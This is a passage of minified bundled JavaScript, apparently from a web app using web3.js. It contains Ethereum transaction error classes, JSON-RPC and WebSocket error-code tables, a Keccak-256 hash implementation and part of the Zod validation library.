            super(`maxPriorityFeePerGas: ${(n=t.maxPriorityFeePerGas)!==null&&n!==void 0?n:"undefined"}, maxFeePerGas: ${(r=t.maxFeePerGas)!==null&&r!==void 0?r:"undefined"}`, "pre-eip-1559 transaction don't support maxFeePerGas/maxPriorityFeePerGas"), this.code = hC
        }
    }
    class rP extends ce {
        constructor(t) {
            super(t, "invalid transaction object"), this.code = pC
        }
    }
    class iP extends ce {
        constructor(t) {
            var n, r;
            super(`nonce: ${(n=t.nonce)!==null&&n!==void 0?n:"undefined"}, chainId: ${(r=t.chainId)!==null&&r!==void 0?r:"undefined"}`, "Nonce or chainId is lower than 0"), this.code = mC
        }
    }
    class oP extends ce {
        constructor() {
            super("UnableToPopulateNonceError", "unable to populate nonce, no from address available"), this.code = gC
        }
    }
    class sP extends ce {
        constructor() {
            super("Eip1559NotSupportedError", "Network doesn't support eip-1559"), this.code = vC
        }
    }
    class uy extends ce {
        constructor(t) {
            super(t, "unsupported transaction type"), this.code = yC
        }
    }
    class $x extends ce {
        constructor(t) {
            var n, r;
            super(`data: ${(n=t.data)!==null&&n!==void 0?n:"undefined"}, input: ${(r=t.input)!==null&&r!==void 0?r:"undefined"}`, `You can't have "data" and "input" as properties of transactions at the same time, please use either "data" or "input" instead.`), this.code = wC
        }
    }
    class aP extends ne {
        constructor(t) {
            super(`The connected Ethereum Node did not respond within ${t.numberOfSeconds} seconds, please make sure your transaction was properly sent and you are connected to a healthy Node. Be aware that transaction might still be pending or mined!
	Transaction Hash: ${t.transactionHash?t.transactionHash.toString():"not available"}`), this.code = SC
        }
    }

    function Ux(e) {
        return `Please make sure your transaction was properly sent and there are no previous pending transaction for the same account. However, be aware that it might still be mined!
	Transaction Hash: ${e?e.toString():"not available"}`
    }
    class zx extends ne {
        constructor(t) {
            super(`Transaction was not mined within ${t.numberOfSeconds} seconds. ${Ux(t.transactionHash)}`), this.code = bC
        }
    }
    class Gx extends ne {
        constructor(t) {
            super(`Transaction started at ${t.starterBlockNumber} but was not mined within ${t.numberOfBlocks} blocks. ${Ux(t.transactionHash)}`), this.code = kC
        }
    }
    class lP extends ce {
        constructor(t) {
            var n, r;
            super(`receipt: ${JSON.stringify(t.receipt)}, blockHash: ${(n=t.blockHash)===null||n===void 0?void 0:n.toString()}, transactionHash: ${(r=t.transactionHash)===null||r===void 0?void 0:r.toString()}`, "Receipt missing or blockHash null"), this.code = xC
        }
    }
    class cP extends ce {
        constructor(t) {
            super(`receipt: ${JSON.stringify(t.receipt)}`, "Receipt missing block number"), this.code = EC
        }
    }
    class _p extends ne {
        constructor(t) {
            super(`Invalid signature. "${t}"`), this.code = TC
        }
    }
    class dy extends ce {
        constructor() {
            super("LocalWalletNotAvailableError", "Attempted to index account in local wallet, but no wallet is available"), this.code = AC
        }
    }
    class uP extends ne {
        constructor(t, n) {
            const r = [];
            t.forEach(i => r.push(i.keyword)), super(`The following properties are invalid for the transaction type ${n}: ${r.join(", ")}`), this.code = BC
        }
    }
    class es extends ce {
        constructor(t) {
            super(t, "can not parse as byte data"), this.code = c4
        }
    }
    class b0 extends ce {
        constructor(t) {
            super(t, "can not parse as number data"), this.code = u4
        }
    }
    class x0 extends ce {
        constructor(t) {
            super(t, "invalid ethereum address"), this.code = f4
        }
    }
    class dP extends ce {
        constructor(t) {
            super(t, "not a valid string"), this.code = l4
        }
    }
    class Vx extends ce {
        constructor(t) {
            super(t, "invalid unit"), this.code = d4
        }
    }
    class Wx extends ce {
        constructor(t) {
            super(t, "not a valid unit. Must be a positive integer"), this.code = b4
        }
    }
    class fP extends ce {
        constructor(t) {
            super(t, "can not be converted to hex"), this.code = h4
        }
    }
    class qx extends ce {
        constructor(t) {
            super(t, "value greater than the nibble width"), this.code = w4
        }
    }
    class E0 extends ce {
        constructor(t) {
            super(t, "not a valid boolean."), this.code = p4
        }
    }
    class hP extends ce {
        constructor(t) {
            super(t, "not a valid unsigned integer."), this.code = m4
        }
    }
    class fy extends ce {
        constructor(t) {
            super(t, "invalid size given."), this.code = g4
        }
    }
    class hy extends ce {
        constructor(t) {
            super(t, "value is larger than size."), this.code = v4
        }
    }
    class pP extends ce {
        constructor(t) {
            super(t, "invalid string given"), this.code = y4
        }
    }
    const mP = e => !Array.isArray(e) && e.jsonrpc === "2.0" && !!e && (e.result === void 0 || e.result === null) && "error" in e && (typeof e.id == "number" || typeof e.id == "string"),
        py = e => mP(e) ? e.error.message : "";
    class Dn extends ne {
        constructor(t, n, r, i) {
            var o;
            super(n ?? `Returned error: ${Array.isArray(t)?t.map(a=>py(a)).join(","):py(t)}`), this.code = j5, n || (this.data = Array.isArray(t) ? t.map(a => {
                var l;
                return (l = a.error) === null || l === void 0 ? void 0 : l.data
            }) : (o = t == null ? void 0 : t.error) === null || o === void 0 ? void 0 : o.data), this.statusCode = i, this.request = r;
            let s;
            "error" in t ? s = t.error : t instanceof Array && (s = t.filter(a => a.error).map(a => a.error)), Array.isArray(s) && s.length > 0 ? this.cause = new Pa(s) : this.cause = s
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                data: this.data,
                request: this.request,
                statusCode: this.statusCode
            })
        }
    }
    class Ud extends Dn {
        constructor(t, n) {
            super(t, void 0, n), this.code = H5;
            let r;
            "error" in t ? r = t.error : t instanceof Array && (r = t.map(i => i.error)), Array.isArray(r) ? this.cause = new Pa(r) : this.cause = r
        }
    }
    class my extends ne {
        constructor(t, n) {
            super(`Web3Config hardfork doesnt match in defaultHardfork ${t} and common.hardfork ${n}`), this.code = Ox
        }
    }
    class gy extends ne {
        constructor(t, n) {
            super(`Web3Config chain doesnt match in defaultHardfork ${t} and common.hardfork ${n}`), this.code = Ox
        }
    }
    const Qx = "An Rpc error has occured with a code of *code*",
        ht = {
            [gu]: {
                message: "Parse error",
                description: "Invalid JSON"
            },
            [vu]: {
                message: "Invalid request",
                description: "JSON is not a valid request object	"
            },
            [yu]: {
                message: "Method not found",
                description: "Method does not exist	"
            },
            [wu]: {
                message: "Invalid params",
                description: "Invalid method parameters"
            },
            [bu]: {
                message: "Internal error",
                description: "Internal JSON-RPC error"
            },
            [xu]: {
                message: "Invalid input",
                description: "Missing or invalid parameters"
            },
            [Eu]: {
                message: "Resource not found",
                description: "Requested resource not found"
            },
            [Au]: {
                message: "Resource unavailable",
                description: "Requested resource not available"
            },
            [_u]: {
                message: "Transaction rejected",
                description: "Transaction creation failed"
            },
            [Su]: {
                message: "Method not supported",
                description: "Method is not implemented"
            },
            [ku]: {
                message: "Limit exceeded",
                description: "Request exceeds defined limit"
            },
            [Tu]: {
                message: "JSON-RPC version not supported",
                description: "Version of JSON-RPC protocol is not supported"
            },
            [t4]: {
                name: "User Rejected Request",
                message: "The user rejected the request."
            },
            [n4]: {
                name: "Unauthorized",
                message: "The requested method and/or account has not been authorized by the user."
            },
            [r4]: {
                name: "Unsupported Method",
                message: "The Provider does not support the requested method."
            },
            [i4]: {
                name: "Disconnected",
                message: "The Provider is disconnected from all chains."
            },
            [o4]: {
                name: "Chain Disconnected",
                message: "The Provider is not connected to the requested chain."
            },
            "0-999": {
                name: "",
                message: "Not used."
            },
            1e3: {
                name: "Normal Closure",
                message: "The connection successfully completed the purpose for which it was created."
            },
            1001: {
                name: "Going Away",
                message: "The endpoint is going away, either because of a server failure or because the browser is navigating away from the page that opened the connection."
            },
            1002: {
                name: "Protocol error",
                message: "The endpoint is terminating the connection due to a protocol error."
            },
            1003: {
                name: "Unsupported Data",
                message: "The connection is being terminated because the endpoint received data of a type it cannot accept. (For example, a text-only endpoint received binary data.)"
            },
            1004: {
                name: "Reserved",
                message: "Reserved. A meaning might be defined in the future."
            },
            1005: {
                name: "No Status Rcvd",
                message: "Reserved. Indicates that no status code was provided even though one was expected."
            },
            1006: {
                name: "Abnormal Closure",
                message: "Reserved. Indicates that a connection was closed abnormally (that is, with no close frame being sent) when a status code is expected."
            },
            1007: {
                name: "Invalid frame payload data",
                message: "The endpoint is terminating the connection because a message was received that contained inconsistent data (e.g., non-UTF-8 data within a text message)."
            },
            1008: {
                name: "Policy Violation",
                message: "The endpoint is terminating the connection because it received a message that violates its policy. This is a generic status code, used when codes 1003 and 1009 are not suitable."
            },
            1009: {
                name: "Message Too Big",
                message: "The endpoint is terminating the connection because a data frame was received that is too large."
            },
            1010: {
                name: "Mandatory Ext.",
                message: "The client is terminating the connection because it expected the server to negotiate one or more extension, but the server didn't."
            },
            1011: {
                name: "Internal Error",
                message: "The server is terminating the connection because it encountered an unexpected condition that prevented it from fulfilling the request."
            },
            1012: {
                name: "Service Restart",
                message: "The server is terminating the connection because it is restarting."
            },
            1013: {
                name: "Try Again Later",
                message: "The server is terminating the connection due to a temporary condition, e.g. it is overloaded and is casting off some of its clients."
            },
            1014: {
                name: "Bad Gateway",
                message: "The server was acting as a gateway or proxy and received an invalid response from the upstream server. This is similar to 502 HTTP Status Code."
            },
            1015: {
                name: "TLS handshake",
                message: "Reserved. Indicates that the connection was closed due to a failure to perform a TLS handshake (e.g., the server certificate can't be verified)."
            },
            "1016-2999": {
                name: "",
                message: "For definition by future revisions of the WebSocket Protocol specification, and for definition by extension specifications."
            },
            "3000-3999": {
                name: "",
                message: "For use by libraries, frameworks, and applications. These status codes are registered directly with IANA. The interpretation of these codes is undefined by the WebSocket protocol."
            },
            "4000-4999": {
                name: "",
                message: "For private use, and thus can't be registered. Such codes can be used by prior agreements between WebSocket applications. The interpretation of these codes is undefined by the WebSocket protocol."
            }
        };
    class en extends ne {
        constructor(t, n) {
            super(n ?? Qx.replace("*code*", t.error.code.toString())), this.code = t.error.code, this.id = t.id, this.jsonrpc = t.jsonrpc, this.jsonRpcError = t.error
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                error: this.jsonRpcError,
                id: this.id,
                jsonRpc: this.jsonrpc
            })
        }
    }
    class gP extends ne {
        constructor(t, n) {
            var r, i, o, s;
            if (!t) super();
            else if (!((r = ht[t]) === null || r === void 0) && r.message) super(ht[t].message);
            else {
                const a = Object.keys(ht).find(l => typeof l == "string" && t >= parseInt(l.split("-")[0], 10) && t <= parseInt(l.split("-")[1], 10));
                super((o = (i = ht[a ?? ""]) === null || i === void 0 ? void 0 : i.message) !== null && o !== void 0 ? o : Qx.replace("*code*", (s = t == null ? void 0 : t.toString()) !== null && s !== void 0 ? s : '""'))
            }
            this.code = t, this.data = n
        }
    }
    class vP extends en {
        constructor(t) {
            super(t, ht[gu].message), this.code = gu
        }
    }
    class yP extends en {
        constructor(t) {
            super(t, ht[vu].message), this.code = vu
        }
    }
    class wP extends en {
        constructor(t) {
            super(t, ht[yu].message), this.code = yu
        }
    }
    class bP extends en {
        constructor(t) {
            super(t, ht[wu].message), this.code = wu
        }
    }
    class xP extends en {
        constructor(t) {
            super(t, ht[bu].message), this.code = bu
        }
    }
    class EP extends en {
        constructor(t) {
            super(t, ht[xu].message), this.code = xu
        }
    }
    class AP extends en {
        constructor(t) {
            super(t, ht[Su].message), this.code = Su
        }
    }
    class _P extends en {
        constructor(t) {
            super(t, ht[Au].message), this.code = Au
        }
    }
    class SP extends en {
        constructor(t) {
            super(t, ht[Eu].message), this.code = Eu
        }
    }
    class kP extends en {
        constructor(t) {
            super(t, ht[Tu].message), this.code = Tu
        }
    }
    class TP extends en {
        constructor(t) {
            super(t, ht[_u].message), this.code = _u
        }
    }
    class IP extends en {
        constructor(t) {
            super(t, ht[ku].message), this.code = ku
        }
    }
    const St = new Map;
    St.set(gu, {
        error: vP
    });
    St.set(vu, {
        error: yP
    });
    St.set(yu, {
        error: wP
    });
    St.set(wu, {
        error: bP
    });
    St.set(bu, {
        error: xP
    });
    St.set(xu, {
        error: EP
    });
    St.set(Su, {
        error: AP
    });
    St.set(Au, {
        error: _P
    });
    St.set(_u, {
        error: TP
    });
    St.set(Eu, {
        error: SP
    });
    St.set(Tu, {
        error: kP
    });
    St.set(ku, {
        error: IP
    });
    class CP extends ne {
        constructor(t) {
            super(`Format for the type ${t} is unsupported`), this.type = t, this.code = E4
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                type: this.type
            })
        }
    }

    function Nt(e) {
        if (!Number.isSafeInteger(e) || e < 0) throw new Error(`positive integer expected, not ${e}`)
    }

    function PP(e) {
        if (typeof e != "boolean") throw new Error(`boolean expected, not ${e}`)
    }

    function RP(e) {
        return e instanceof Uint8Array || e != null && typeof e == "object" && e.constructor.name === "Uint8Array"
    }

    function Hs(e, ...t) {
        if (!RP(e)) throw new Error("Uint8Array expected");
        if (t.length > 0 && !t.includes(e.length)) throw new Error(`Uint8Array expected of length ${t}, not of length=${e.length}`)
    }

    function A0(e) {
        if (typeof e != "function" || typeof e.create != "function") throw new Error("Hash should be wrapped by utils.wrapConstructor");
        Nt(e.outputLen), Nt(e.blockLen)
    }

    function oo(e, t = !0) {
        if (e.destroyed) throw new Error("Hash instance has been destroyed");
        if (t && e.finished) throw new Error("Hash#digest() has already been called")
    }

    function _0(e, t) {
        Hs(e);
        const n = t.outputLen;
        if (e.length < n) throw new Error(`digestInto() expects output buffer of length at least ${n}`)
    }
    const Kx = {
            number: Nt,
            bool: PP,
            bytes: Hs,
            hash: A0,
            exists: oo,
            output: _0
        },
        pc = BigInt(2 ** 32 - 1),
        vy = BigInt(32);

    function NP(e, t = !1) {
        return t ? {
            h: Number(e & pc),
            l: Number(e >> vy & pc)
        } : {
            h: Number(e >> vy & pc) | 0,
            l: Number(e & pc) | 0
        }
    }

    function BP(e, t = !1) {
        let n = new Uint32Array(e.length),
            r = new Uint32Array(e.length);
        for (let i = 0; i < e.length; i++) {
            const {
                h: o,
                l: s
            } = NP(e[i], t);
            [n[i], r[i]] = [o, s]
        }
        return [n, r]
    }
    const MP = (e, t, n) => e << n | t >>> 32 - n,
        OP = (e, t, n) => t << n | e >>> 32 - n,
        LP = (e, t, n) => t << n - 32 | e >>> 64 - n,
        FP = (e, t, n) => e << n - 32 | t >>> 64 - n,
        Nc = typeof globalThis == "object" && "crypto" in globalThis ? globalThis.crypto : void 0; /*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const Bc = e => new Uint32Array(e.buffer, e.byteOffset, Math.floor(e.byteLength / 4)),
        Mc = e => new DataView(e.buffer, e.byteOffset, e.byteLength),
        Nn = (e, t) => e << 32 - t | e >>> t,
        ge = (e, t) => e << t | e >>> 32 - t >>> 0,
        Cu = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68,
        DP = e => e << 24 & 4278190080 | e << 8 & 16711680 | e >>> 8 & 65280 | e >>> 24 & 255;

    function Pu(e) {
        for (let t = 0; t < e.length; t++) e[t] = DP(e[t])
    }

    function hs(e) {
        if (typeof e != "string") throw new Error(`utf8ToBytes expected string, got ${typeof e}`);
        return new Uint8Array(new TextEncoder().encode(e))
    }

    function ps(e) {
        return typeof e == "string" && (e = hs(e)), Hs(e), e
    }

    function Ru(...e) {
        let t = 0;
        for (let r = 0; r < e.length; r++) {
            const i = e[r];
            Hs(i), t += i.length
        }
        const n = new Uint8Array(t);
        for (let r = 0, i = 0; r < e.length; r++) {
            const o = e[r];
            n.set(o, i), i += o.length
        }
        return n
    }
    class S0 {
        clone() {
            return this._cloneInto()
        }
    }
    const jP = {}.toString;

    function Zx(e, t) {
        if (t !== void 0 && jP.call(t) !== "[object Object]") throw new Error("Options should be object or undefined");
        return Object.assign(e, t)
    }

    function Yx(e) {
        const t = r => e().update(ps(r)).digest(),
            n = e();
        return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = () => e(), t
    }

    function Jx(e = 32) {
        if (Nc && typeof Nc.getRandomValues == "function") return Nc.getRandomValues(new Uint8Array(e));
        throw new Error("crypto.getRandomValues must be defined")
    }
    const Xx = [],
        eE = [],
        tE = [],
        HP = BigInt(0),
        na = BigInt(1),
        $P = BigInt(2),
        UP = BigInt(7),
        zP = BigInt(256),
        GP = BigInt(113);
    for (let e = 0, t = na, n = 1, r = 0; e < 24; e++) {
        [n, r] = [r, (2 * n + 3 * r) % 5], Xx.push(2 * (5 * r + n)), eE.push((e + 1) * (e + 2) / 2 % 64);
        let i = HP;
        for (let o = 0; o < 7; o++) t = (t << na ^ (t >> UP) * GP) % zP, t & $P && (i ^= na << (na << BigInt(o)) - na);
        tE.push(i)
    }
    const [VP, WP] = BP(tE, !0), yy = (e, t, n) => n > 32 ? LP(e, t, n) : MP(e, t, n), wy = (e, t, n) => n > 32 ? FP(e, t, n) : OP(e, t, n);

    function qP(e, t = 24) {
        const n = new Uint32Array(10);
        for (let r = 24 - t; r < 24; r++) {
            for (let s = 0; s < 10; s++) n[s] = e[s] ^ e[s + 10] ^ e[s + 20] ^ e[s + 30] ^ e[s + 40];
            for (let s = 0; s < 10; s += 2) {
                const a = (s + 8) % 10,
                    l = (s + 2) % 10,
                    u = n[l],
                    c = n[l + 1],
                    d = yy(u, c, 1) ^ n[a],
                    f = wy(u, c, 1) ^ n[a + 1];
                for (let h = 0; h < 50; h += 10) e[s + h] ^= d, e[s + h + 1] ^= f
            }
            let i = e[2],
                o = e[3];
            for (let s = 0; s < 24; s++) {
                const a = eE[s],
                    l = yy(i, o, a),
                    u = wy(i, o, a),
                    c = Xx[s];
                i = e[c], o = e[c + 1], e[c] = l, e[c + 1] = u
            }
            for (let s = 0; s < 50; s += 10) {
                for (let a = 0; a < 10; a++) n[a] = e[s + a];
                for (let a = 0; a < 10; a++) e[s + a] ^= ~n[(a + 2) % 10] & n[(a + 4) % 10]
            }
            e[0] ^= VP[r], e[1] ^= WP[r]
        }
        n.fill(0)
    }
    class k0 extends S0 {
        constructor(t, n, r, i = !1, o = 24) {
            if (super(), this.blockLen = t, this.suffix = n, this.outputLen = r, this.enableXOF = i, this.rounds = o, this.pos = 0, this.posOut = 0, this.finished = !1, this.destroyed = !1, Nt(r), 0 >= this.blockLen || this.blockLen >= 200) throw new Error("Sha3 supports only keccak-f1600 function");
            this.state = new Uint8Array(200), this.state32 = Bc(this.state)
        }
        keccak() {
            Cu || Pu(this.state32), qP(this.state32, this.rounds), Cu || Pu(this.state32), this.posOut = 0, this.pos = 0
        }
        update(t) {
            oo(this);
            const {
                blockLen: n,
                state: r
            } = this;
            t = ps(t);
            const i = t.length;
            for (let o = 0; o < i;) {
                const s = Math.min(n - this.pos, i - o);
                for (let a = 0; a < s; a++) r[this.pos++] ^= t[o++];
                this.pos === n && this.keccak()
            }
            return this
        }
        finish() {
            if (this.finished) return;
            this.finished = !0;
            const {
                state: t,
                suffix: n,
                pos: r,
                blockLen: i
            } = this;
            t[r] ^= n, n & 128 && r === i - 1 && this.keccak(), t[i - 1] ^= 128, this.keccak()
        }
        writeInto(t) {
            oo(this, !1), Hs(t), this.finish();
            const n = this.state,
                {
                    blockLen: r
                } = this;
            for (let i = 0, o = t.length; i < o;) {
                this.posOut >= r && this.keccak();
                const s = Math.min(r - this.posOut, o - i);
                t.set(n.subarray(this.posOut, this.posOut + s), i), this.posOut += s, i += s
            }
            return t
        }
        xofInto(t) {
            if (!this.enableXOF) throw new Error("XOF is not possible for this instance");
            return this.writeInto(t)
        }
        xof(t) {
            return Nt(t), this.xofInto(new Uint8Array(t))
        }
        digestInto(t) {
            if (_0(t, this), this.finished) throw new Error("digest() was already called");
            return this.writeInto(t), this.destroy(), t
        }
        digest() {
            return this.digestInto(new Uint8Array(this.outputLen))
        }
        destroy() {
            this.destroyed = !0, this.state.fill(0)
        }
        _cloneInto(t) {
            const {
                blockLen: n,
                suffix: r,
                outputLen: i,
                rounds: o,
                enableXOF: s
            } = this;
            return t || (t = new k0(n, r, i, s, o)), t.state32.set(this.state32), t.pos = this.pos, t.posOut = this.posOut, t.finished = this.finished, t.rounds = o, t.suffix = r, t.outputLen = i, t.enableXOF = s, t.destroyed = this.destroyed, t
        }
    }
    const QP = (e, t, n) => Yx(() => new k0(t, e, n)),
        by = QP(1, 136, 256 / 8),
        Nu = Kx.bytes;

    function nE(e) {
        if (!(e instanceof Uint8Array)) throw new TypeError(`bytesToUtf8 expected Uint8Array, got ${typeof e}`);
        return new TextDecoder().decode(e)
    }

    function KP(e, t) {
        if (e.length !== t.length) return !1;
        for (let n = 0; n < e.length; n++)
            if (e[n] !== t[n]) return !1;
        return !0
    }

    function ZP(e) {
        return t => (Kx.bytes(t), e(t))
    }(() => {
        const e = typeof globalThis == "object" && "crypto" in globalThis ? globalThis.crypto : void 0,
            t = typeof ga < "u" && typeof ga.require == "function" && ga.require.bind(ga);
        return {
            node: t && !e ? t("crypto") : void 0,
            web: e
        }
    })();
    const bt = (() => {
        const e = ZP(by);
        return e.create = by.create, e
    })();
    var pe;
    (function(e) {
        e.assertEqual = i => i;

        function t(i) {}
        e.assertIs = t;

        function n(i) {
            throw new Error
        }
        e.assertNever = n, e.arrayToEnum = i => {
            const o = {};
            for (const s of i) o[s] = s;
            return o
        }, e.getValidEnumValues = i => {
            const o = e.objectKeys(i).filter(a => typeof i[i[a]] != "number"),
                s = {};
            for (const a of o) s[a] = i[a];
            return e.objectValues(s)
        }, e.objectValues = i => e.objectKeys(i).map(function(o) {
            return i[o]
        }), e.objectKeys = typeof Object.keys == "function" ? i => Object.keys(i) : i => {
            const o = [];
            for (const s in i) Object.prototype.hasOwnProperty.call(i, s) && o.push(s);
            return o
        }, e.find = (i, o) => {
            for (const s of i)
                if (o(s)) return s
        }, e.isInteger = typeof Number.isInteger == "function" ? i => Number.isInteger(i) : i => typeof i == "number" && isFinite(i) && Math.floor(i) === i;

        function r(i, o = " | ") {
            return i.map(s => typeof s == "string" ? `'${s}'` : s).join(o)
        }
        e.joinValues = r, e.jsonStringifyReplacer = (i, o) => typeof o == "bigint" ? o.toString() : o
    })(pe || (pe = {}));
    var Sp;
    (function(e) {
        e.mergeShapes = (t, n) => ({ ...t,
            ...n
        })
    })(Sp || (Sp = {}));
    const V = pe.arrayToEnum(["string", "nan", "number", "integer", "float", "boolean", "date", "bigint", "symbol", "function", "undefined", "null", "array", "object", "unknown", "promise", "void", "never", "map", "set"]),
        Hr = e => {
            switch (typeof e) {
                case "undefined":
                    return V.undefined;
                case "string":
                    return V.string;
                case "number":
                    return isNaN(e) ? V.nan : V.number;
                case "boolean":
                    return V.boolean;
                case "function":
                    return V.function;
                case "bigint":
                    return V.bigint;
                case "symbol":
                    return V.symbol;
                case "object":
                    return Array.isArray(e) ? V.array : e === null ? V.null : e.then && typeof e.then == "function" && e.catch && typeof e.catch == "function" ? V.promise : typeof Map < "u" && e instanceof Map ? V.map : typeof Set < "u" && e instanceof Set ? V.set : typeof Date < "u" && e instanceof Date ? V.date : V.object;
                default:
                    return V.unknown
            }
        },
        j = pe.arrayToEnum(["invalid_type", "invalid_literal", "custom", "invalid_union", "invalid_union_discriminator", "invalid_enum_value", "unrecognized_keys", "invalid_arguments", "invalid_return_type", "invalid_date", "invalid_string", "too_small", "too_big", "invalid_intersection_types", "not_multiple_of", "not_finite"]),
        YP = e => JSON.stringify(e, null, 2).replace(/"([^"]+)":/g, "$1:");
    class Qt extends Error {
        constructor(t) {
            super(), this.issues = [], this.addIssue = r => {
                this.issues = [...this.issues, r]
            }, this.addIssues = (r = []) => {
                this.issues = [...this.issues, ...r]
            };
            const n = new.target.prototype;
            Object.setPrototypeOf ? Object.setPrototypeOf(this, n) : this.__proto__ = n, this.name = "ZodError", this.issues = t
        }
        get errors() {
            return this.issues
        }
        format(t) {
            const n = t || function(o) {
                    return o.message
                },
                r = {
                    _errors: []
                },
                i = o => {
                    for (const s of o.issues)
                        if (s.code === "invalid_union") s.unionErrors.map(i);
                        else if (s.code === "invalid_return_type") i(s.returnTypeError);
                    else if (s.code === "invalid_arguments") i(s.argumentsError);
                    else if (s.path.length === 0) r._errors.push(n(s));
                    else {
                        let a = r,
                            l = 0;
                        for (; l < s.path.length;) {
                            const u = s.path[l];
                            l === s.path.length - 1 ? (a[u] = a[u] || {
                                _errors: []
                            }, a[u]._errors.push(n(s))) : a[u] = a[u] || {
                                _errors: []
                            }, a = a[u], l++
                        }
                    }
                };
            return i(this), r
        }
        static assert(t) {
            if (!(t instanceof Qt)) throw new Error(`Not a ZodError: ${t}`)
        }
        toString() {
            return this.message
        }
        get message() {
            return JSON.stringify(this.issues, pe.jsonStringifyReplacer, 2)
        }
        get isEmpty() {
            return this.issues.length === 0
        }
        flatten(t = n => n.message) {
            const n = {},
                r = [];
            for (const i of this.issues) i.path.length > 0 ? (n[i.path[0]] = n[i.path[0]] || [], n[i.path[0]].push(t(i))) : r.push(t(i));
            return {
                formErrors: r,
                fieldErrors: n
            }
        }
        get formErrors() {
            return this.flatten()
        }
    }
    Qt.create = e => new Qt(e);
    const ms = (e, t) => {
        let n;
        switch (e.code) {
            case j.invalid_type:
                e.received === V.undefined ? n = "Required" : n = `Expected ${e.expected}, received ${e.received}`;
                break;
            case j.invalid_literal:
                n = `Invalid literal value, expected ${JSON.stringify(e.expected,pe.jsonStringifyReplacer)}`;
                break;
            case j.unrecognized_keys:
                n = `Unrecognized key(s) in object: ${pe.joinValues(e.keys,", ")}`;
                break;
            case j.invalid_union:
                n = "Invalid input";
                break;
            case j.invalid_union_discriminator:
                n = `Invalid discriminator value. Expected ${pe.joinValues(e.options)}`;
                break;
            case j.invalid_enum_value:
                n = `Invalid enum value. Expected ${pe.joinValues(e.options)}, received '${e.received}'`;
                break;
            case j.invalid_arguments:
                n = "Invalid function arguments";
                break;
            case j.invalid_return_type:
                n = "Invalid function return type";
                break;
            case j.invalid_date:
                n = "Invalid date";
                break;
            case j.invalid_string:
                typeof e.validation == "object" ? "includes" in e.validation ? (n = `Invalid input: must include "${e.validation.includes}"`, typeof e.validation.position == "number" && (n = `${n} at one or more positions greater than or equal to ${e.validation.position}`)) : "startsWith" in e.validation ? n = `Invalid input: must start with "${e.validation.startsWith}"` : "endsWith" in e.validation ? n = `Invalid input: must end with "${e.validation.endsWith}"` : pe.assertNever(e.validation) : e.validation !== "regex" ? n = `Invalid ${e.validation}` : n = "Invalid";
                break;
            case j.too_small:
                e.type === "array" ? n = `Array must contain ${e.exact?"exactly":e.inclusive?"at least":"more than"} ${e.minimum} element(s)` : e.type === "string" ? n = `String must contain ${e.exact?"exactly":e.inclusive?"at least":"over"} ${e.minimum} character(s)` : e.type === "number" ? n = `Number must be ${e.exact?"exactly equal to ":e.inclusive?"greater than or equal to ":"greater than "}${e.minimum}` : e.type === "date" ? n = `Date must be ${e.exact?"exactly equal to ":e.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(e.minimum))}` : n = "Invalid input";
                break;
            case j.too_big:
                e.type === "array" ? n = `Array must contain ${e.exact?"exactly":e.inclusive?"at most":"less than"} ${e.maximum} element(s)` : e.type === "string" ? n = `String must contain ${e.exact?"exactly":e.inclusive?"at most":"under"} ${e.maximum} character(s)` : e.type === "number" ? n = `Number must be ${e.exact?"exactly":e.inclusive?"less than or equal to":"less than"} ${e.maximum}` : e.type === "bigint" ? n = `BigInt must be ${e.exact?"exactly":e.inclusive?"less than or equal to":"less than"} ${e.maximum}` : e.type === "date" ? n = `Date must be ${e.exact?"exactly":e.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(e.maximum))}` : n = "Invalid input";
                break;
            case j.custom:
                n = "Invalid input";
                break;
            case j.invalid_intersection_types:
                n = "Intersection results could not be merged";
                break;
            case j.not_multiple_of:
                n = `Number must be a multiple of ${e.multipleOf}`;
                break;
            case j.not_finite:
                n = "Number must be finite";
                break;
            default:
                n = t.defaultError, pe.assertNever(e)
        }
        return {
            message: n
        }
    };
    let rE = ms;

    function JP(e) {
        rE = e
    }

    function Bu() {
        return rE
    }
    const Mu = e => {
            const {
                data: t,
                path: n,
                errorMaps: r,
                issueData: i
            } = e, o = [...n, ...i.path || []], s = { ...i,
                path: o
            };
            if (i.message !== void 0) return { ...i,
                path: o,
                message: i.message
            };
            let a = "";
            const l = r.filter(u => !!u).slice().reverse();
            for (const u of l) a = u(s, {
                data: t,
                defaultError: a
            }).message;
            return { ...i,
                path: o,
                message: a
            }
        },
        XP = [];

    function z(e, t) {
        const n = Bu(),
            r = Mu({
                issueData: t,
                data: e.data,
                path: e.path,
                errorMaps: [e.common.contextualErrorMap, e.schemaErrorMap, n, n === ms ? void 0 : ms].filter(i => !!i)
            });
        e.common.issues.push(r)
    }
    class mt {
        constructor() {
            this.value = "valid"
        }
        dirty() {
            this.value === "valid" && (this.value = "dirty")
        }
        abort() {
            this.value !== "aborted" && (this.value = "aborted")
        }
        static mergeArray(t, n) {
            const r = [];
            for (const i of n) {
                if (i.status === "aborted") return te;
                i.status === "dirty" && t.dirty(), r.push(i.value)
            }
            return {
                status: t.value,
                value: r
            }
        }
        static async mergeObjectAsync(t, n) {
            const r = [];
            for (const i of n) {
                const o = await i.key,
                    s = await i.value;
                r.push({
                    key: o,
                    value: s
                })
            }
            return mt.mergeObjectSync(t, r)
        }
        static mergeObjectSync(t, n) {
            const r = {};
            for (const i of n) {
                const {
                    key: o,
                    value: s
                } = i;
                if (o.status === "aborted" || s.status === "aborted") return te;
                o.status === "dirty" && t.dirty(), s.status === "dirty" && t.dirty(), o.value !== "__proto__" && (typeof s.value < "u" || i.alwaysSet) && (r[o.value] = s.value)
            }
            return {
                status: t.value,
                value: r
            }
        }
    }
    const te = Object.freeze({
            status: "aborted"
        }),
        Go = e => ({
            status: "dirty",
            value: e
        }),
        kt = e => ({
            status: "valid",
            value: e
        }),
        kp = e => e.status === "aborted",
        Tp = e => e.status === "dirty",
        tl = e => e.status === "valid",
        nl = e => typeof Promise < "u" && e instanceof Promise;

    function Ou(e, t, n, r) {
        if (typeof t == "function" ? e !== t || !r : !t.has(e)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
        return t.get(e)
    }

